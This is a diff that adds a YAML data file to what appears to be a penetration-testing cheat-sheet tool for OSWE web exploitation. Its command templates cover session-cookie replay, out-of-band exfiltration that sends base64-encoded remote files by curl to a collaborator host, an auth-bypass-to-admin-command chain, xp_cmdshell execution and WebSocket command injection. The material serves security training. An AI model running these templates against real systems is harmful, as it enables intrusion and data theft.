@@ -1,0 +1,159 @@
+sections:
+  - id: oswe.webz
+    title: 'OSWE — Web exploitation III'
+    os: linux
+    order: 303
+    techniques:
+      [
+        oswe.session.hijack,
+        oswe.exfil.data,
+        oswe.rce.chain,
+        oswe.rce.dbfunc,
+        oswe.bypass.charset,
+        oswe.token.weakrandom,
+        oswe.cmdinj.websocket,
+      ]
+    packs: [oswe]
+techniques:
+  - id: oswe.session.hijack
+    title: 'Session hijacking'
+    os: [linux]
+    phase: web
+    summary: 'Replay a captured session cookie to ride an authenticated session.'
+    commands: [oswe.session.hijack.replay]
+    tags: [web, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.exfil.data
+    title: 'Data exfiltration (OOB)'
+    os: [linux]
+    phase: exfiltration
+    summary: 'Smuggle data out of band to your collaborator host.'
+    commands: [oswe.exfil.data.oob]
+    tags: [web, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.rce.chain
+    title: 'RCE (chained auth-bypass → exec)'
+    os: [linux]
+    phase: exploitation
+    summary: 'Compose an auth bypass with an execution sink to reach RCE.'
+    commands: [oswe.rce.chain.compose]
+    relatedIds: [oswe.php.typejuggle, oswe.pgsql.udfrevshell]
+    tags: [web, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.rce.dbfunc
+    title: 'RCE via database functions'
+    os: [linux]
+    phase: exploitation
+    summary: 'Reach OS exec through a database function (xp_cmdshell / COPY PROGRAM / INTO OUTFILE).'
+    commands: [oswe.rce.dbfunc.xp]
+    tags: [web, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.bypass.charset
+    title: 'Character-restriction bypass'
+    os: [linux]
+    phase: web
+    summary: 'Encode payloads (CHAR()/hex) to slip past a character allow-list.'
+    commands: [oswe.bypass.charset.char]
+    tags: [web, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.token.weakrandom
+    title: 'Weak random token generation'
+    os: [linux]
+    phase: web
+    summary: 'Predict a reset/session token seeded from a low-entropy source.'
+    commands: [oswe.token.weakrandom.predict]
+    tags: [web, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+  - id: oswe.cmdinj.websocket
+    title: 'OS command injection via WebSockets'
+    os: [linux]
+    phase: web
+    summary: 'Connect to the socket and inject into a server-side command parameter.'
+    commands: [oswe.cmdinj.websocket.wscat]
+    tags: [web, oswe]
+    references: [ref.osce3.joas, ref.oswe.timip]
+    confidence: verified
+    packs: [oswe]
+commands:
+  - id: oswe.session.hijack.replay
+    title: 'Cookie replay'
+    template: 'curl -b "session={{SESSION}}" "{{URL}}"'
+    shell: bash
+    os: [linux]
+    tags: [web]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.exfil.data.oob
+    title: 'OOB collaborator exfil'
+    template: 'curl -s "http://{{COLLAB}}/?d=$(base64 -w0 {{REMOTE_FILE}})"'
+    shell: bash
+    os: [linux]
+    tags: [web]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.rce.chain.compose
+    title: 'Auth-bypass → admin exec chain'
+    template: 'curl -s "{{URL}}/login" -d "user[]=1&hash[]=2" -c jar; curl -s -b jar "{{URL}}/admin" -d "cmd={{CMD}}"'
+    shell: bash
+    os: [linux]
+    tags: [web]
+    danger: critical
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.rce.dbfunc.xp
+    title: 'xp_cmdshell exec'
+    template: 'EXEC xp_cmdshell ''{{CMD}}'';'
+    shell: sql
+    os: [linux]
+    tags: [web]
+    danger: critical
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.bypass.charset.char
+    title: 'CHAR() encoding bypass'
+    template: 'SELECT CHAR(65,66,67);'
+    shell: sql
+    os: [linux]
+    tags: [web]
+    danger: medium
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.token.weakrandom.predict
+    title: 'Time-seeded token predict (PHP)'
+    template: 'php -r "mt_srand(time()); echo mt_rand();"'
+    shell: bash
+    os: [linux]
+    tags: [web]
+    danger: medium
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
+  - id: oswe.cmdinj.websocket.wscat
+    title: 'wscat connect'
+    template: 'wscat -c "ws://{{RHOST}}:{{RPORT}}/ws"'
+    shell: bash
+    os: [linux]
+    tags: [web]
+    danger: high
+    confidence: verified
+    references: [ref.osce3.joas, ref.oswe.timip]
+    packs: [oswe]
